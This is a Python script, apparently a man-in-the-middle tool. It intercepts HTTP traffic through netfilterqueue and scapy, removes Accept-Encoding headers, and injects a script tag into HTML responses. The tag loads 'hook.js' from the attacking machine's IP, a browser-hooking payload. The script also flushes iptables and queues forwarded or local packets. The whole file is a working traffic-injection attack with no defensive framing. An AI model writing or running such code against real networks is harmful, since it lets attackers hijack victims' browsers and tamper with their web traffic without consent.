import netfilterqueue
from scapy.layers.l2 import Raw
from scapy.layers.inet import IP, TCP
from scapy.arch import get_if_addr
from scapy.config import conf
import argparse
import os
from termcolor import cprint
import re

LINE = '____________________________________________________________'
END_TAG = '</body>'
IP_ADDRESS = get_if_addr(conf.iface) #IP of DEFAULT interface of MITM PC
SCRIPT_TAG = '<script src="http://'+IP_ADDRESS+':3000/hook.js"></script>'

#Process each packet
def process_packet(packet):
    IP_pkt = IP(packet.get_payload())
    
    if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
        #To manage fail of python convertion of some bytes
        #(No HTML code, so I don't want to analyse this packet)
        try:
            load = IP_pkt[Raw].load.decode()
        
            if IP_pkt[TCP].dport == 80:
                cprint('Request', 'red', attrs=['bold',])
                
                '''Search for Accept-Encoding Header (?\\r\\n = stop at first occurrence of \\r\\n)
                Remove Accept-Encoding header from request(we don't understand any encoding)
                '''
                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                IP_pkt[Raw].load = load

                #Scapy recomputes them
                del IP_pkt[IP].len
                del IP_pkt[IP].chksum
                del IP_pkt[TCP].chksum

                packet.set_payload(bytes(IP_pkt))

            elif IP_pkt[TCP].sport == 80:
                cprint('Response', 'blue', attrs=['bold',])
                load = injection_code(load)

                IP_pkt[Raw].load = load
        
                #Scapy recomputes them
                del IP_pkt[IP].len
                del IP_pkt[IP].chksum
                del IP_pkt[TCP].chksum

                packet.set_payload(bytes(IP_pkt))
        
        except UnicodeDecodeError:
            pass
    
    packet.accept()


def injection_code(load):
    global END_TAG, SCRIPT_TAG

    #If the HTML page has TAG, I'm going to replace it with javascript code
    load = load.replace(END_TAG, SCRIPT_TAG+END_TAG)
    #If ?: for group (), group used to locate expression but it's not stored in expression
    content_length_header = re.search("(?:Content-Length:\s)(\d*)", load)

    if content_length_header and 'text/html' in load:
        content_length = content_length_header.group(1)
        print(f'Length {content_length}', end='')
        new_length = int(content_length) + len(SCRIPT_TAG)
        print(f'     {new_length}')
        load = load.replace(content_length, str(new_length))
        print(f'     {load}')

    return load

#Parser of command line argument
def args_parser():
    global SCRIPT_TAG

    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')

    #Parse command line arguments
    args = parser.parse_args()
    
    return args.local


def main():
    local = args_parser()

    #Packets are blocked and not forwarded
    if local:
        os.system('iptables -F')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    else:
        os.system('iptables -F')
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')


    #O = queue num
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        cprint(f'\nTCP packets\n{LINE}','green', attrs=['bold',])
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        cprint(f'\n{LINE}','green', attrs=['bold',])
        print('Flushing ip table.', end='\n')
        cprint(f'{LINE}','green', attrs=['bold',], end='\n\n')
        os.system('iptables -F')

if __name__=='__main__':
	main()
